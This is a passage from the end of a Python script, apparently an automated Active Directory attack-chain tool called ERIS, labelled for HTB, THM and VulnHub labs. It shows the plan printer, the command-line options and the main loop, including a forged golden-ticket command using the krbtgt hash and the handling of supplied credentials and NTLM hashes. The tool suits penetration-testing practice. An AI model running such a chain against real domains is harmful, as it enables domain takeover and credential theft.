        f"impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain {ctx.domain} Administrator",
    ]))

    oc = {"LOW": GREEN, "MEDIUM": YELLOW, "HIGH": RED}
    cur_phase = None
    for i, (phase, risk, name, cmds) in enumerate(plan, 1):
        if phase != cur_phase:
            cur_phase = phase
            c = PHASE_COLORS[phase]
            print(f"\n{BOLD}{c}── FASE {phase.value}: {phase.name} ──{R}")
        print(f"\n{BOLD}[{i:02d}] {name}{R}  OPSEC: {oc[risk]}{risk}{R}")
        for cmd in cmds:
            if cmd.startswith("#") or "→" in cmd:
                print(f"  {GRAY}  {cmd}{R}")
            else:
                print(f"  {GREEN}  $ {cmd}{R}")


# ─── MAIN ────────────────────────────────────────────────────────────────────
def main() -> None:
    parser = argparse.ArgumentParser(
        description="ERIS — AD Attack Chain | Solo entornos controlados: HTB · THM · VulnHub",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modo automático (ejecuta toda la cadena):
  python3 eris.py -t 10.10.10.175 -d egotistical-bank.local --auto

Con lista de usuarios conocida:
  python3 eris.py -t 10.10.10.175 -d corp.local --users users.txt --auto

Con credenciales conocidas (salta al post-enum):
  python3 eris.py -t 10.10.10.175 -d corp.local --creds 'john:Password123' --auto

Reanudar sesión anterior:
  python3 eris.py --resume eris_output/eris_state.json

Solo sugerencias (sin ejecutar nada):
  python3 eris.py -t 10.10.10.175 -d corp.local --plan
        """
    )
    parser.add_argument("-t", "--target",  help="IP del objetivo / DC")
    parser.add_argument("-d", "--domain",  help="Dominio AD (ej: corp.local)")
    parser.add_argument(      "--dc",      help="IP del DC si difiere del target")
    parser.add_argument("-u", "--users",   help="Archivo con usuarios (uno por línea)")
    parser.add_argument("-o", "--output",  default="eris_output", help="Directorio de salida")
    parser.add_argument(      "--auto",    action="store_true", help="Ejecutar cadena completa")
    parser.add_argument(      "--plan",    action="store_true", help="Solo mostrar ruta (sin ejecutar)")
    parser.add_argument(      "--resume",  help="Reanudar desde eris_state.json")
    parser.add_argument(      "--creds",   help="Credenciales conocidas: user:pass")
    parser.add_argument(      "--hash",    help="Hash NTLM conocido: user:NThash")
    args = parser.parse_args()

    print(BANNER)

    # Construir contexto
    if args.resume:
        ctx = ErisContext.load(args.resume)
        log_ok(f"Estado cargado: {args.resume}")
        log_info(f"Fases completadas: {ctx.phase_done}")
    else:
        if not args.target or not args.domain:
            parser.print_help()
            sys.exit(1)
        ctx = ErisContext(
            target_ip  = args.target,
            domain     = args.domain.upper(),
            dc_ip      = args.dc or args.target,
            output_dir = args.output,
        )

    # Cargar usuarios
    if args.users and Path(args.users).exists():
        raw = Path(args.users).read_text().splitlines()
        ctx.users = [u.strip() for u in raw if u.strip()]
        log_ok(f"{len(ctx.users)} usuarios cargados desde {args.users}")

    # Cargar credenciales
    if args.creds and ":" in args.creds:
        u, p = args.creds.split(":", 1)
        ctx.cracked[u] = p
        log_ok(f"Credenciales: {u}:{p}")

    if args.hash and ":" in args.hash:
        u, h = args.hash.split(":", 1)
        ctx.hashes_ntlm[u] = h
        log_ok(f"Hash NTLM: {u}:{h}")

    runner = Runner(ctx)
    chain  = ErisChain(ctx, runner)

    if args.plan:
        run_plan_mode(ctx)
    elif args.auto or args.resume:
        chain.run_full_chain()
    else:
        print(f"{YELLOW}Elige un modo:{R}")
        print(f"  --auto   Ejecutar cadena completa")
        print(f"  --plan   Ver ruta sugerida sin ejecutar")
        print(f"  --resume Reanudar sesión anterior")


if __name__ == "__main__":
    main()
